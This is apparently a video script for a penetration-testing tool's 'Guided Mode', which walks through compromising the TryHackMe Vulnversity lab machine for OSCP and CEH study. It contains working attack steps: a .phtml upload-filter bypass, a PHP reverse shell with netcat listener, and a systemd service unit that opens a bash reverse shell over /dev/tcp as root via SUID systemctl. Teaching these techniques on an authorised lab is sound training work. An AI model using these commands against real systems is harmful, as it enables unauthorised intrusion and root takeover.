# VIDEO 55: Guided Mode
### Step-by-Step Methodology, Questionnaire & Workflow Automation
**Suggested length:** 14–18 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Information Gathering through Reporting (full methodology) | CEH: System Hacking (methodology approach)

---

## INTRO (0:00 – 1:30)

**[Screen: Huginn splash screen with Section 10 title card "Advanced Features and Workflows"]**

> "Welcome to Section 10 — Advanced Features and Workflows. Over the past 54 videos, we've explored every tool in Huginn's arsenal individually. Now we bring it all together. Guided Mode is for anyone who wants the full methodology without needing to remember which tool to use next. It walks you through the entire attack chain — from initial setup through recon, scanning, exploitation, and reporting — step by step, adapting to what it discovers along the way."

**[Screen: Slide showing the attack chain phases with arrows connecting them: Setup → Recon → Scan → Exploit → Elevate → Report, with "Guided Mode" badge overlaying the entire chain]**

> "Think of Guided Mode as your methodology co-pilot. It asks you questions about the engagement, configures the right tools, chains results from one phase into the next, and keeps you on track. Whether you're studying for OSCP and want to build repeatable habits, or you're running a real engagement and want to ensure nothing gets missed — Guided Mode handles the workflow orchestration so you can focus on analysis and decision-making. Let's walk through it end-to-end against a TryHackMe room."

---

## SECTION 1: Launching Guided Mode (1:30 – 3:30)

**[Screen: Huginn main dashboard — clicking the "Guided Workflow" option from the attack chain home page]**

> "Guided Mode lives in the attack chain home page. Click the raven icon in the top navigation to return to the attack chain dashboard, then select 'Guided Workflow (Step-by-step)' from the workflow selector. This immediately launches the questionnaire graph — a decision tree that adapts based on your answers."

**[Screen: Opening questionnaire displayed — "What type of workflow would you like?" with options: "Guided Workflow (Step-by-step)" and "Environment-Specific (AD/AWS/Azure/GCP)"]**

> "The opening question asks what kind of workflow you want. 'Guided Workflow' is the full methodology walkthrough — that's what we're covering today. 'Environment-Specific' lets you jump straight into AD, AWS, Azure, or GCP-focused questionnaires if you already know your target environment. We'll select 'Guided Workflow' for a complete end-to-end demonstration."

```bash
# Guided Mode workflow selection:
┌─────────────────────────────────────────────────┐
│  What type of workflow would you like?           │
│                                                  │
│  ○ Guided Workflow (Step-by-step)      ← select │
│  ○ Environment-Specific (AD/AWS/Azure/GCP)      │
└─────────────────────────────────────────────────┘
```

**[Screen: Environment selection — options showing "Standalone Server", "Active Directory", "Microsoft Azure", "AWS", "Google Cloud"]**

> "Next, Guided Mode asks about the target environment. Our TryHackMe Vulnversity machine is a standalone Linux server — no domain controller, no cloud infrastructure. Select 'Standalone Server' and the questionnaire narrows to the relevant tools for that environment type. If you selected Active Directory, you'd get additional steps for Kerberoasting, GPP passwords, and BloodHound — the same techniques we covered in Video 49 (see Video 49: Active Directory Enumeration)."

**[Screen: Engagement setup component — fields for target IP/hostname, engagement name, scope notes]**

> "Now Guided Mode prompts for engagement details. Enter the target IP — for Vulnversity that's whatever THM assigned — name the engagement, and define the scope. The scope field is important: it records what you're authorized to test. For our lab, the scope is the single machine IP on all ports. In a real engagement, this would document client authorization boundaries."

```bash
# Engagement setup:
Target: 10.10.183.42  (THM Vulnversity)
Engagement: THM-Vulnversity-Demo
Scope: Single host, all ports, all services
Notes: TryHackMe lab - full exploitation authorized
```

---

## SECTION 2: Guided Recon Phase (3:30 – 6:00)

**[Screen: Guided Mode transitioning to "Recon" phase — progress bar showing Step 1 of 6, with the phase icon highlighted in the attack chain toolbar]**

> "The first active phase is Recon. Guided Mode presents a checklist of reconnaissance tasks tailored to your environment selection. For a standalone server, it suggests: port scanning, service enumeration, and web application discovery. Each task has a 'Run' button that pre-configures the appropriate tool with your target already filled in."

**[Screen: Recon step list showing: "1. Port Scan (Full TCP)", "2. Service Version Detection", "3. Web Application Discovery" — each with a Run button and status indicator]**

> "Let's start with the port scan. Click 'Run' next to Port Scan and Guided Mode launches Huginn's port scanner (see Video 6: Port Scanning) with the target IP pre-configured. It defaults to a full TCP scan — all 65,535 ports — because the guided questionnaire identified this as a standalone server where we need complete visibility."

```bash
# Guided Mode → Recon → Port Scan
huginn scan --target 10.10.183.42 --type tcp-full --service-detection on

[*] Starting full TCP port scan on 10.10.183.42
[*] Discovered ports:
    21/tcp   open  vsftpd 3.0.3
    22/tcp   open  OpenSSH 7.2p2
    139/tcp  open  Samba smbd 3.X
    445/tcp  open  Samba smbd 4.3.11
    3128/tcp open  Squid http proxy 3.5.12
    3333/tcp open  Apache httpd 2.4.18
[*] Scan complete: 6 ports open, 65529 closed/filtered
```

**[Screen: Port scan results populating in the Guided Mode panel — services listed with version numbers, the next step "Service Enumeration" auto-enabled]**

> "Six open ports found — FTP, SSH, Samba, a Squid proxy, and an Apache web server on port 3333. Notice how Guided Mode automatically enables the next step now that port scan data is available. It also highlights port 3333 as a web service target — that's the attack surface we'll focus on."

**[Screen: Guided Mode suggesting "Web Application Discovery" step — auto-populated with http://10.10.183.42:3333/ based on port scan results]**

> "Guided Mode chains the results forward. It detected Apache on port 3333 and pre-populates the web application discovery step with that URL. Click 'Run' and it performs directory enumeration, looking for hidden paths. This is the same content discovery tool from our scanning videos (see Video 25: Scan Configuration), but Guided Mode handles the configuration automatically."

```bash
# Guided Mode → Recon → Web Application Discovery
huginn discover --url http://10.10.183.42:3333/ --wordlist medium

[*] Starting directory enumeration on http://10.10.183.42:3333/
[+] /internal/        (Status: 301) [Size: 323]
[+] /css/             (Status: 301) [Size: 319]
[+] /js/              (Status: 301) [Size: 318]
[+] /images/          (Status: 301) [Size: 323]
[+] /fonts/           (Status: 301) [Size: 322]
[*] Discovery complete: 5 directories found
[!] Interesting: /internal/ — potential upload functionality
```

---

## SECTION 3: Guided Scan Phase (6:00 – 8:30)

**[Screen: Guided Mode transitioning to "Scan" phase — progress bar showing Step 2 of 6, previous Recon phase marked with green checkmark]**

> "Recon is complete — Guided Mode marks it green and advances to the Scan phase. It takes everything discovered in Recon and configures vulnerability scanning automatically. The scan targets are pre-set: the web application on port 3333 and the /internal/ directory we found during discovery."

**[Screen: Scan configuration panel — pre-populated with target http://10.10.183.42:3333/, scan profile set to "Normal", with checkboxes for "Include discovered directories" (checked) and "Service-specific scans" (checked)]**

> "The scan profile defaults to Normal — a good balance of thoroughness and speed for a single target. 'Include discovered directories' is checked, meaning the scanner will specifically probe /internal/ for vulnerabilities. 'Service-specific scans' runs checks against the FTP, SSH, and Samba services we found earlier. Click 'Start Scan' to run everything in parallel."

```bash
# Guided Mode → Scan → Vulnerability Assessment
[*] Configuring Normal profile scan...
[*] Targets:
    - http://10.10.183.42:3333/ (web application)
    - http://10.10.183.42:3333/internal/ (discovered directory)
    - vsftpd 3.0.3 (FTP service check)
    - OpenSSH 7.2p2 (SSH vulnerability check)
    - Samba 4.3.11 (SMB vulnerability check)

[*] Scanning web application...
[+] File upload form found at /internal/
[+] Extension filter detected — testing bypass
[+] .phtml extension ACCEPTED — upload filter bypass possible
[!] VULNERABILITY: Unrestricted file upload via extension bypass
    Severity: High
    Location: http://10.10.183.42:3333/internal/
    Details: Server accepts .phtml files which execute as PHP

[*] Service vulnerability checks...
[+] vsftpd 3.0.3 — no known critical CVEs
[+] OpenSSH 7.2p2 — CVE-2016-6515 (DoS only, Low severity)
[+] Samba 4.3.11 — CVE-2017-7494 (SambaCry, High severity)

[*] Scan complete: 2 High, 1 Low, 0 Info findings
```

**[Screen: Scan results displayed in Guided Mode — findings listed with severity badges, the file upload vulnerability highlighted as the primary attack vector]**

> "Two high-severity findings: an unrestricted file upload via extension bypass at /internal/, and a potential SambaCry vulnerability in the Samba service. Guided Mode ranks these by exploitability and recommends which to pursue first. The file upload is rated as the easiest path — it just needs a crafted PHP file with a .phtml extension. This is the kind of prioritization logic that comes from the attack chain orchestrator analyzing the combined scan results."

**[Screen: Guided Mode showing "Recommended attack path" — a visual arrow from "File Upload Bypass" to "PHP Web Shell" to "Reverse Shell" to "Privilege Escalation"]**

> "Guided Mode goes further — it maps out a recommended attack path. Upload a PHP reverse shell as a .phtml file, trigger it to get a shell, then escalate privileges. This is the orchestrator working in the background, correlating findings with known exploitation techniques from the exploit database."

---

## SECTION 4: Guided Exploit Phase (8:30 – 11:30)

**[Screen: Guided Mode transitioning to "Exploit" phase — progress bar at Step 3 of 6, showing the recommended attack path highlighted]**

> "The Exploit phase is where Guided Mode truly shines for learning methodology. It doesn't just tell you what to exploit — it walks you through the steps, explains what each one does, and confirms you understand before proceeding. This is how OSCP expects you to think: identify the vulnerability, prepare the exploit, set up your listener, execute, and verify."

**[Screen: Exploit step 1 — "Prepare Payload" with instructions: "Generate a PHP reverse shell with .phtml extension targeting your listener IP and port"]**

> "Step one: prepare the payload. Guided Mode knows we need a PHP reverse shell. It prompts for your listener IP and port — that's your attack machine's IP on the THM VPN. Enter those and it generates the payload. In a real engagement, this integrates with Runecraft for more sophisticated payloads (see Video 56: Runecraft Payload Builder), but for our purposes a standard PHP reverse shell suffices."

```bash
# Guided Mode → Exploit → Prepare Payload
Listener IP: 10.6.42.85  (our THM VPN IP)
Listener Port: 4444

[*] Generating PHP reverse shell payload...
[*] Filename: shell.phtml (bypasses extension filter)
[*] Payload saved to: /tmp/huginn_payloads/shell.phtml
[*] Contents: php-reverse-shell configured for 10.6.42.85:4444
```

**[Screen: Exploit step 2 — "Set Up Listener" with a pre-configured netcat command and a "Start Listener" button]**

> "Step two: set up your listener before sending the payload. Guided Mode provides the exact command — netcat listening on port 4444. Click 'Start Listener' and it opens an integrated terminal with the listener running. This sequencing is important — many beginners forget to start the listener before triggering the payload."

```bash
# Guided Mode → Exploit → Start Listener
[*] Starting reverse shell listener...
$ nc -lvnp 4444
listening on [any] 4444 ...
```

**[Screen: Exploit step 3 — "Deploy Payload" showing the upload form at /internal/ with the shell.phtml file ready to upload]**

> "Step three: deploy the payload. Guided Mode opens the target's upload form and shows you exactly where to submit your .phtml file. Upload it, then navigate to the uploaded file location to trigger execution. Guided Mode even suggests the likely upload path based on common web server configurations."

```bash
# Guided Mode → Exploit → Deploy Payload
[*] Uploading shell.phtml to http://10.10.183.42:3333/internal/
[+] Upload successful!
[*] Trigger URL: http://10.10.183.42:3333/internal/uploads/shell.phtml

# Trigger the payload:
[*] Requesting http://10.10.183.42:3333/internal/uploads/shell.phtml
[+] Connection received on listener!

# Listener output:
connect to [10.6.42.85] from (UNKNOWN) [10.10.183.42] 48726
Linux vulnversity 4.4.0-142-generic #168-Ubuntu x86_64
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**[Screen: Guided Mode exploit phase showing green checkmarks on all three steps — shell obtained as www-data]**

> "We have a shell as www-data. Guided Mode confirms the exploitation succeeded and marks all exploit steps complete. Notice it didn't just dump you at a shell prompt — it verified the connection, confirmed the user context, and logged everything for your engagement notes. The attack chain methodology says exploitation is confirmed, now we move to elevation."

---

## SECTION 5: Guided Elevate Phase (11:30 – 13:30)

**[Screen: Guided Mode transitioning to "Elevate" phase — Step 4 of 6, showing "Privilege Escalation Checks" as the first task]**

> "The Elevate phase runs privilege escalation checks through your active shell. Guided Mode doesn't require Enterprise tier features here — it uses the information gathered through the shell to suggest escalation paths. It checks SUID binaries, cron jobs, writable paths, and kernel version."

**[Screen: Privilege escalation checklist running — items checking off: "SUID binaries", "Cron jobs", "Writable directories", "Kernel version", "sudo permissions"]**

> "Guided Mode runs each check and reports findings. For Vulnversity, the key finding is a SUID binary — /bin/systemctl has the SUID bit set, which means we can create a custom service that runs as root. This is a classic Linux privilege escalation vector."

```bash
# Guided Mode → Elevate → Privilege Escalation Checks
$ find / -perm -4000 -type f 2>/dev/null
/bin/systemctl    ← SUID set (unusual!)
/bin/mount
/bin/ping
/bin/su
/usr/bin/passwd
/usr/bin/sudo
...

[!] FINDING: /bin/systemctl has SUID bit set
    Risk: Critical — allows service creation as root
    Exploitation: Create a systemd service unit that spawns a root shell

# Guided Mode suggests the escalation technique:
[*] Recommended: Create a .service unit file that executes a reverse shell as root
```

**[Screen: Guided Mode providing the privilege escalation steps — creating a service file, enabling it, triggering a root shell]**

> "Guided Mode walks you through the escalation: create a temporary service unit file that runs a bash reverse shell, use systemctl to enable and start it, and catch the root shell on a new listener. This is methodology in action — we're not guessing, we're following a logical chain from finding to exploitation."

```bash
# Guided Mode → Elevate → Execute Escalation
# Create malicious service:
$ echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.6.42.85/5555 0>&1"
[Install]
WantedBy=multi-user.target' > /tmp/root.service

# Start listener on port 5555 (new terminal):
$ nc -lvnp 5555

# Enable and start the service:
$ /bin/systemctl enable /tmp/root.service
$ /bin/systemctl start root

# Root shell received:
connect to [10.6.42.85] from (UNKNOWN) [10.10.183.42] 39812
root@vulnversity:/# whoami
root
root@vulnversity:/# cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
```

**[Screen: Guided Mode showing "Root access achieved" with a green badge, engagement progress at 80%]**

> "Root achieved. Guided Mode logs the flag and confirms full compromise. This entire chain — from initial port scan to root shell — followed a logical methodology. Every step fed into the next. That's what Guided Mode teaches: not just how to use individual tools, but how to think through an engagement systematically."

---

## SECTION 6: Guided Report Phase (13:30 – 15:30)

**[Screen: Guided Mode transitioning to "Report" phase — Step 5 of 6, showing auto-populated findings from the engagement]**

> "The final active phase is reporting. Guided Mode has been logging findings throughout the engagement — it automatically captured the file upload vulnerability, the SUID escalation vector, and the service versions discovered during recon. These are already categorized and scored."

**[Screen: Auto-generated findings list showing: 1) Unrestricted File Upload (High, CVSS 8.2), 2) SUID systemctl (Critical, CVSS 9.8), 3) Samba CVE-2017-7494 (High, CVSS 7.5), 4) OpenSSH CVE (Low, CVSS 3.7)]**

> "Four findings auto-populated — two from scanning, two from our exploitation. The SUID systemctl finding is rated Critical because we proved root access through it. The file upload is High because it provided initial access. Guided Mode scores these based on what we actually achieved, not just theoretical impact. This is more accurate than automated scanning alone (see Video 50: Findings Management)."

```bash
# Guided Mode → Report → Auto-Generated Findings
┌────────────────────────────────────────────────────────────────┐
│ Finding                     │ Severity │ CVSS │ Status         │
├─────────────────────────────┼──────────┼──────┼────────────────┤
│ SUID systemctl (Priv Esc)   │ Critical │ 9.8  │ Exploited      │
│ Unrestricted File Upload    │ High     │ 8.2  │ Exploited      │
│ Samba CVE-2017-7494         │ High     │ 7.5  │ Confirmed      │
│ OpenSSH CVE-2016-6515       │ Low      │ 3.7  │ Confirmed      │
└────────────────────────────────────────────────────────────────┘
```

**[Screen: Report generation dialog — "Generate Engagement Report" with format options (PDF, HTML, JSON) and template selection]**

> "Click 'Generate Report' and Guided Mode produces a complete engagement report from the auto-collected data. It includes the timeline of your methodology, evidence from each phase, and remediation recommendations. For a lab exercise like THM, this is practice for writing real pentest reports. For a real engagement, this saves hours of documentation work. Select PDF, click generate, and your professional report is ready (see Video 51: Standard Report Generation for detailed format options)."

---

## SECTION 7: Certification Tips and Mindmap Navigation (15:30 – 17:00)

**[Screen: Guided Mode's mindmap visualization — showing the questionnaire graph as an interactive node diagram with completed paths highlighted in green]**

> "Before we wrap up, let me show you the mindmap. This visual representation of the questionnaire graph shows every possible path through Guided Mode. Completed paths are green, available paths are blue, and locked paths are grey. You can click any node to jump to that step — useful when you want to repeat a specific phase or explore alternate paths you didn't take."

**[Screen: OSCP tip slide — "Use Guided Mode to build your methodology muscle memory — when exam day comes, you'll execute the steps instinctively"]**

> "For OSCP preparation — use Guided Mode on every HTB machine until the methodology is second nature. The exam gives you five machines in 24 hours. You don't have time to think about what to do next — it needs to be automatic. Guided Mode builds those habits. Start a machine, run through the guided workflow, and notice how the steps become instinctive after ten repetitions."

**[Screen: CEH tip — "Guided Mode demonstrates the five-phase hacking methodology that CEH tests: Reconnaissance → Scanning → Gaining Access → Maintaining Access → Covering Tracks"]**

> "For CEH — the five-phase hacking methodology maps directly to Guided Mode's attack chain phases. Reconnaissance is our Recon phase, Scanning maps to Scan, Gaining Access is Exploit, Maintaining Access is Elevate, and the reporting phase helps you understand documentation requirements. Practice with Guided Mode and you're practicing the CEH methodology framework."

**[Screen: Practice recommendation — "Run Guided Mode on 5 different THM rooms this week: Vulnversity, Basic Pentesting, Kenobi, Skynet, and Alfred"]**

> "Practice targets: after Vulnversity, try Guided Mode on these THM rooms — Basic Pentesting for a similar Linux path, Kenobi for Samba exploitation, Skynet for a longer chain, and Alfred for a Windows target. Each one exercises different tools within the guided framework. The more diverse targets you practice on, the stronger your methodology becomes."

---

## OUTRO (17:00 – end)

**[Screen: Summary slide — Guided Mode: Launch → Questionnaire → Recon → Scan → Exploit → Elevate → Report (all connected with arrows) | Next: Video 56 — Runecraft Payload Builder]**

> "That's Guided Mode — Huginn's methodology co-pilot that walks you through engagements step by step. We launched it, answered the questionnaire, and completed an entire attack chain against Vulnversity: port scanning through service enumeration, vulnerability scanning that found the file upload, exploitation with a PHP reverse shell, privilege escalation via SUID systemctl, and automated report generation. All on the Free tier. In the next video, we go deeper into payload generation with Runecraft — Huginn's custom payload builder for crafting reverse shells, bind shells, web shells, and obfuscated payloads for complex engagements. See you in Video 56."
